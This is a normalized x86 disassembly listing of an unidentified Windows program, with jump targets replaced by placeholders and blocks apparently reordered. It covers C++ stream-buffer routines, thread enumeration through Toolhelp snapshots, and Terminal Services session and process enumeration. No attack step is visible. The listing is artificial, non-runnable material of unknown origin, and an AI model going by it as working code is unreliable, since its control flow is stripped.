mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_406180
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_43a8a0
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
sub_40f5f0
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_40f640
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_40f6b0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_40f870
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ esp + 0xc ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_40f9a0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_40f9e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f0b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_40fa10
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f3d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_40fa40
push ebp
mov ebp esp
push 0xffffffff
push sub_45293c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
cmp [ ebp + 0x10 ] 0x0
mov [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov esi [ edx + 0x4 ]
add esi edi
mov ecx esi
call sub_402e90
mov eax [ ebp + 0x8 ]
push 0x20
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x0
call sub_404a20
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x40 ] ax
jne r-xdata
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
or eax 0x4
push 0x0
push eax
mov ecx esi
call sub_402d50
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push esi
call sub_435d3f
add esp 0x4
sub_40fb50
push ebp
mov ebp esp
push 0xffffffff
push sub_4517e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ eax + 0x40 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
test cl 0x2
jne r-xdata
test cl 0x4
jne r-xdata
mov edx [ eax + 0x24 ]
cmp [ edx ] ebx
je r-xdata
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
lea edi [ ebp - 0x48 ]
mov [ esi ] bl
call sub_405c40
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov edx [ eax + 0x20 ]
cmp [ edx ] ebx
je r-xdata
mov edx [ edx ]
mov ecx [ eax + 0x3c ]
cmp ecx edx
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x48 ]
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
add ecx [ edx ]
mov edx [ eax + 0x10 ]
mov eax [ edx ]
sub ecx eax
push ecx
mov edi 0xf
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_405a70
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
lea edi [ ebp - 0x2c ]
mov [ esi ] bl
call sub_405c40
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
push ecx
mov edi 0xf
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_405a70
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
lea edi [ ebp - 0x2c ]
mov [ esi ] bl
call sub_405c40
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx edx
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
mov ecx [ ebp - 0x2c ]
jmp r-xdata
call sub_43811c
add esp 0x4
push ecx
sub_40fc90
push ebp
mov ebp esp
push 0xffffffff
push sub_4511ab
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_4361c7
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_438178
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_43609f
mov [ edi ] eax
call sub_435e5e
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_436188
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_4361b0
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40fd80
push ebp
mov ebp esp
push 0xffffffff
push sub_451388
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_402e50
mov ecx eax
mov [ ebp - 0x4 ] 0x0
call sub_40fe30
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x18 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_40fe30
push ebp
mov ebp esp
push 0xffffffff
push sub_451358
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
push edi
lea edi [ ebp - 0x10 ]
call sub_40ec70
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea eax [ ebp - 0x24 ]
push eax
call sub_43c3a5
lea ecx [ ebp - 0x14 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40ff70
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x0
push 0x4
call [ CreateToolhelp32Snapshot@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor al al
pop esi
call sub_437c1c
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x20 ]
push eax
push esi
mov [ ebp - 0x20 ] 0x1c
call [ Thread32First@IAT ]
test eax eax
setne al
mov [ ebp - 0x21 ] al
test al al
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov al [ ebp - 0x21 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
push edi
lea esp [ esp ]
mov edi [ ebx + 0x4 ]
lea edx [ ebp - 0x20 ]
cmp edx edi
jae r-xdata
mov ecx [ eax ]
cmp ecx [ ebp - 0x14 ]
jne r-xdata
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
mov ecx edx
cmp eax ecx
ja r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
push esi
call [ Thread32Next@IAT ]
test eax eax
jne r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov ecx ebx
call sub_410080
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop edi
add [ ebx + 0x4 ] 0x1c
lea esi [ ebp - 0x20 ]
mov eax [ ebx ]
lea edx [ esi * 8 ]
sub edx esi
lea esi [ eax + edx * 4 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov ecx ebx
call sub_410080
mov esi [ ebp - 0x28 ]
mov edi eax
jmp r-xdata
mov ecx 0x7
[ edi ] [ esi ]
sub_410080
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x9249248
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_410100
mov eax esi
cmp eax esi
jae r-xdata
sub_410100
push ebp
mov ebp esp
push 0xffffffff
push sub_451070
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_406210
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov ebx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
mov [ ebp - 0x14 ] eax
call sub_410200
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add esp 0x4
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx * 8 ]
sub edx ebx
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
push edi
call sub_43811c
add esp 0x4
sub_410200
cmp edx ebx
je r-xdata
retn
push esi
push edi
add edx 0x1c
add eax 0x1c
cmp edx ebx
jne r-xdata
mov ecx 0x7
mov esi edx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_410230
push ebp
mov ebp esp
push 0xffffffff
push sub_451eb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test ecx ecx
mov [ ebp - 0x4c ] eax
sete al
mov [ ebp - 0x3c ] 0x0
test al al
je r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
xor esi esi
mov [ ebp - 0x40 ] esi
jmp r-xdata
push ecx
call sub_438f73
add esp 0x4
mov esi eax
push esi
call [ WTSOpenServerW@IAT ]
mov ebx eax
push esi
mov [ ebp - 0x40 ] ebx
call sub_438111
add esp 0x4
test ebx ebx
setne al
mov esi ebx
mov ecx [ ecx ]
test al al
je r-xdata
xor al al
lea ecx [ ebp - 0x3c ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
push 0x1
push 0x0
push esi
call [ WTSEnumerateSessionsW@IAT ]
test eax eax
setne bl
mov [ ebp - 0x35 ] bl
test bl bl
je r-xdata
test esi esi
je r-xdata
cmp [ ebp - 0x3c ] 0x0
mov [ ebp - 0x44 ] 0x0
jbe r-xdata
mov al bl
jmp r-xdata
push esi
call [ WTSCloseServer@IAT ]
mov eax [ ebp - 0x48 ]
push eax
call [ WTSFreeMemory@IAT ]
xor esi esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx ebx
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x2c ]
call sub_401c90
mov ebx [ ebp - 0x4c ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call sub_410790
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x44 ]
inc eax
add esi 0xc
mov [ ebp - 0x44 ] eax
cmp eax [ ebp - 0x3c ]
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x48 ]
mov ecx [ esi + eax ]
mov [ ebp - 0x34 ] ecx
mov edx [ esi + eax + 0x8 ]
xor ecx ecx
mov [ ebp - 0x30 ] edx
mov eax [ esi + eax + 0x4 ]
mov [ ebp - 0x2c ] cx
mov ecx eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea ebx [ ecx + 0x2 ]
mov bl [ ebp - 0x35 ]
mov esi [ ebp - 0x40 ]
sub_4103a0
push ebp
mov ebp esp
push 0xffffffff
push sub_453996
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0xc4 ] eax
sete al
mov [ ebp - 0xc8 ] ecx
mov [ ebp - 0xb8 ] ebx
cmp al bl
je r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
xor esi esi
mov [ ebp - 0xb4 ] esi
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp al bl
je r-xdata
mov al bl
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ ebp - 0xb0 ]
push edx
push 0x1
push ebx
push esi
call [ WTSEnumerateProcessesW@IAT ]
test eax eax
setne al
mov [ ebp - 0xa9 ] al
cmp al bl
je r-xdata
push eax
call sub_438f73
add esp 0x4
mov edi eax
push edi
call [ WTSOpenServerW@IAT ]
mov esi eax
push edi
mov [ ebp - 0xb4 ] esi
call sub_438111
add esp 0x4
cmp esi ebx
setne al
cmp esi ebx
je r-xdata
mov [ ebp - 0xbc ] ebx
cmp [ ebp - 0xb8 ] ebx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
